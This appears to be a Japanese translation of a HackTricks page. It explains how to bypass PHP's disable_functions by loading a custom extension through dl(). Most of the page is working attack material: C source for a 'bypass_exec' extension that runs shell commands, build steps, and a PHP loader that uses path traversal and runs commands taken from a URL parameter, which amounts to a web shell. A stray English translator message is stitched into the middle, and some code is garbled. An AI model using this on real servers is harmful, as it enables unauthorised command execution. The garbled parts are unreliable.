<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksに広告を掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>

**重要な注意:**

![image](https://user-images.githubusercontent.com/84577967/174675487-a4c4ca06-194f-4725-85af-231a2f35d56c.png)

**`dl`** はPHP拡張機能をロードするために使用されるPHP関数です。この関数が無効にされていない場合、**`disable_functions`をバイパスして任意のコマンドを実行する**ために悪用される可能性があります。
ただし、いくつかの厳しい制限があります:

* `dl` 関数は**環境内に存在し**、**無効にされていない**必要があります
* PHP拡張機能は、サーバーが使用しているものと同じメジャーバージョン（PHP APIバージョン）で**コンパイルされている必要があります**（この情報はphpinfoの出力で確認できます）
* PHP拡張機能は、**`extension_dir`** ディレクティブで**定義されているディレクトリに位置している必要があります**（これもphpinfoの出力で確認できます）。攻撃者がサーバーを悪用しようとしている場合、このディレクトリへの書き込みアクセス権を持っている可能性は非常に低いため、この要件がこのテクニックを悪用することを防ぐでしょう。

**これらの要件を満たしている場合は、** [**https://antichat.com/threads/70763/**](https://antichat.com/threads/70763/) **からコピーされたこの投稿を読み続けて、disable\_functionsをバイパスする方法を学んでください**

管理者がボックスを設定する際、[dl関数](http://www.php.net/manual/en/function.dl.php)を見落とし、システムコマンドを実行できるという記述がなかったため無効にしませんでした。
[dl関数](http://www.php.net/manual/en/function.dl.php)は、スクリプトが実行されるときにPHP拡張機能をロードするために使用されます。
\
(PHP拡張機能はC/C++で書かれており、PHPにさらなる機能を提供するために使用されます。)
\
攻撃者は関数が無効にされていないことに気づき、潜在的な可能性を見てPHP拡張機能を作成することを決定します。
攻撃者は小さなスクリプト`<?php echo 'PHP Version is '.PHP_VERSION; ?>` (PHP\_VERSIONはPHPのバージョン番号を含む事前定義された定数です。)を使用してPHPのバージョンをチェックします。
\
攻撃者はバージョンをメモし、[PHPウェブサイト](http://www.php.net/downloads.php)からtarballをダウンロードします。このシナリオではバージョンが現在のリリースより古いため、攻撃者は[アーカイブ](http://museum.php.net)にアクセスする必要があります。
\
次に、ソースを抽出し、自分のボックスでPHPのバージョンを[コンパイルしてインストール](http://www.php.net/manual/en/install.php)します。
\
これで拡張機能の作成の時が来ました
攻撃者はPHPサイトから[PHP拡張機能の作成](http://www.php.net/manual/en/zend.creating.php)について読み上げます。
ドキュメントを読み、自分の拡張機能をいくつか作成した後、既に作成されている関数を探すためにPHPのコードベースを見ることに決めます。
\
複製される関数は[exec関数](http://www.php.net/manual/en/function.exec.php)で、コードベースではext/standard/exec.cに位置しています。
\
関連する部分は新しい拡張機能に実装されます。
\

**注意:**

コードのコンパイルを始める前に、以下の2点を認識しておく必要があります:

1- `bypass.c`ファイル内の`ZEND_MODULE_API_NO`の値を、作業中の現在の`Zend Extension Build`に変更する必要があります。以下のコマンドラインを使用して取得できます:
```bash
php -i | grep "Zend Extension Build" |awk -F"API4" '{print $2}' | awk -F"," '{print $1}'
```
2- 最近のPHPバージョン（5、7、8）でbypass.cファイルのコンパイルにエラーが発生した場合、PHP_FUNCTION(bypass_exec)を以下のように変更できます：
```
PHP_FUNCTION(bypass_exec)
{
FILE *in;
char *command;
size_t command_len;
zend_string *ret;
php_stream *stream;

ZEND_PARSE_PARAMETERS_START(1, 1)
Z_PARAM_STRING(command, command_len)
ZEND_PARSE_PARAMETERS_END();

if (!command_len) {
zend_argument_value_error(1, "cannot be empty");
RETURN_THROWS();
}
if (strlen(command) != command_len) {
zend_argument_value_error(1, "must not contain any null bytes");
RETURN_THROWS();
}

#ifdef PHP_WIN32
if ((in=VCWD_POPEN(command, "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(command, "r"))==NULL) {
#endif
php_error_docref(NULL, E_WARNING, "Unable to execute '%s'", command);
RETURN_FALSE;
}

stream = php_stream_fopen_from_pipe(in, "rb");
ret = php_stream_copy_to_mem(stream, PHP_STREAM_COPY_ALL, 0);
php_stream_close(stream);

if (ret && ZSTR_LEN(ret) > 0) {
RETVAL_STR(ret);
}
}
```
以下に、個別の拡張機能のファイルがあります：

{% code title="bypass.c" %}
```c
/*
+----------------------------------------------------------------------+
| Copyright (c) 1997-2003 The PHP Group                                |
+----------------------------------------------------------------------+
| This source file is subject to version 2.02 of the PHP license,      |
| that is bundled with this package in the file LICENSE, and is        |
| available at through the world-wide-web at                           |
| http://www.php.net/license/2_02.txt.                                 |
| If you did not receive a copy of the PHP license and are unable to   |
| obtain it through the world-wide-web, please send a note to          |
| license@php.net so we can mail you a copy immediately.               |
+----------------------------------------------------------------------+
*/


#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_bypass.h"

static function_entry bypass_functions[] = {
PHP_FE(bypass_exec, NULL)
{NULL, NULL, NULL}
};

zend_module_entry bypass_module_entry = {
#if ZEND_MODULE_API_NO >= 20010901
STANDARD_MODULE_HEADER,
#endif
PHP_BYPASS_EXTNAME,
bypass_functions,
NULL,
NULL,
NULL,
NULL,
NULL,
#if ZEND_MODULE_API_NO >= 20010901
PHP_BYPASS_VERSION,
#endif
STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_BYPASS
ZEND_GET_MODULE(bypass)
#endif


PHP_FUNCTION(bypass_exec){
FILE *in;
int readbytes, total_readbytes=0, allocated_space;
pval **cmd;
char *ret;

if (ZEND_NUM_ARGS()!=1 || zend_get_parameters_ex(1, &cmd)==FAILURE) {
WRONG_PARAM_COUNT;
}

convert_to_string_ex(cmd);
#ifdef PHP_WIN32
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "r"))==NULL) {
#endif
php_error_docref(NULL TSRMLS_CC, E_WARNING, "Unable to execute '%s'", Z_STRVAL_PP(cmd));
RETURN_FALSE;
}

allocated_space = EXEC_INPUT_BUF;
ret = (char *) emalloc(allocated_space);

while (1) {
readbytes = fread(ret+total_readbytes, 1, EXEC_INPUT_BUF, in);
if (readbytes<=0) {
break;
}

total_readbytes += readbytes;
allocated_space = total_readbytes+EXEC_INPUT_BUF;
ret = (char *) erealloc(ret, allocated_space);
}

pclose(in);

RETVAL_STRINGL(ret, total_readbytes, 0);
Z_STRVAL_P(return_value)[total_readbytes] = '\';
}
```
The provided text does not contain any content that requires translation. It consists of markdown syntax for code blocks, which should not be altered. If you have any specific content that needs translation, please provide the text.
```c
#ifndef PHP_BYPASS_H
#define PHP_BYPASS_H 1

#define PHP_BYPASS_VERSION "1.0"
#define PHP_BYPASS_EXTNAME "bypass"

PHP_FUNCTION(bypass_exec);

extern zend_module_entry bypass_module_entry;
#define phpext_bypass_ptr &bypass_module_entry

#endif
```
{% endcode %}

{% code title="config.m4" %}
```bash
PHP_ARG_ENABLE(bypass, [whether to enable bypass support],[--enable-bypass])

if test "$PHP_BYPASS" = "yes"; then
AC_DEFINE(HAVE_BYPASS, 1, [Whether you have bypass])
PHP_NEW_EXTENSION(bypass, bypass.c, $ext_shared)
fi
```
{% endcode %}

ファイルが作成されたら、PHP拡張機能をビルドする時です。
```
phpize
./configure
make
```
作業が完了すると、コンパイルされた拡張機能は、`bypass.so` というファイル名で modules サブディレクトリに配置されます。
ファイルは安全な場所にコピーされた後、新しく作成されたファイルをクリーンアップするために次のコマンドが実行されます。
```
make clean
phpize --clean
```
攻撃者は、新しく作成した拡張機能を被害者ホストにアップロードします。

（注：PHPの主要リリースは異なるAPIバージョンを使用しています。一方のホストで拡張機能をコンパイルしてから別のホストにアップロードするためには、APIバージョンが一致している必要があります。これが攻撃者のボックスに最初に同じPHPバージョンがインストールされた理由です。）

dl関数で拡張機能をロードするには、拡張機能がextension\_dirディレクティブで定義された拡張機能ディレクトリ内にある必要があります。
これは、攻撃者がこのディレクトリに書き込み権限を持っている可能性が低いため、問題になることがありますが、これを回避する方法があります。
この問題は、dl関数のページ内のノートセクションで開発者によって議論されています。

議論されたコンセプトは、定義された拡張機能ディレクトリから相対パスを使用することです。
例えば、拡張機能ディレクトリが/usr/php/extensionsに設定されており、現在のWebディレクトリ/home/example.com/htmlでbypass.soをロードしたい場合、次のようにします：
```php
<?php
dl('../../../home/example.com/html/bypass.so');
?>
```
この方法は、拡張機能を定義された拡張ディレクトリに置く必要を回避します。

異なるホストに対して相対パスを変更する必要がない自動化された方法もあります。このコードはendofyourself \[at] yahoo \[dot] comによって作成され、後にmag\_2000 \[at] front \[dot] ruによって改善されました。

関数には小さな問題がありました。一部のホストでは拡張ディレクトリが"./"に設定されており、この関数は拡張ディレクトリが相対パスに設定されている場合を考慮していませんでした。これを修正するには、realpath関数を使用します。

無効化された関数をバイパスしてシステムコマンドを実行し、拡張機能をロードするための最終スクリプトは以下の通りです：
```php
<?php

function dl_local( $extensionFile ) {
if(!(bool)ini_get('enable_dl')
||(bool)ini_get('safe_mode')){
die('Loading extensions is not permitted.');
}

if(!file_exists($extensionFile)){
die('File '.$extensionFile.' does not exist.');
}

if(!is_executable($extensionFile)){
die('File '.$extensionFile.' is not executable. ( chmod +x '.$extensionFile.' )');
}

$currentDir = getcwd().'/';
$currentExtPath = realpath(ini_get('extension_dir'));

$subDirs = preg_match_all("/\//",$currentExtPath ,$matches);
unset($matches);

if(!(bool)$subDirs){
die('Could not determine a valid extension path [extension_dir]');
}

$extPathLastChar=strlen($currentExtPath )-1;

if($extPathLastChar==strrpos($currentExtPath,'/')){
$subDirs--;}$backDirStr = '';

for($i = 1; $i <= $subDirs; $i++){
$backDirStr .='..';
if($i != $subDirs){
$backDirStr .='/';
}
}

$finalExtPath = $backDirStr.$currentDir.$extensionFile;
if(!dl($finalExtPath)){
die();
}


$loadedExtensions = get_loaded_extensions();
$thisExtName = $loadedExtensions[sizeof($loadedExtensions)-1];
return $thisExtName;
}

@ini_set ('display_errors','1');
error_reporting(E_ALL);

dl_local('bypass.so');

if(@$_GET['cmd']){
$output = bypass_exec($_GET['cmd']);
echo '<pre>'.$output.'</pre>';
}
?>
```
攻撃者が行うべきことは、スクリプトへのURLを呼び出し、必要なコマンドを含むcmd変数を指定することです。
```
http://www.example.com/script.php?cmd=ls
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください。**

</details>
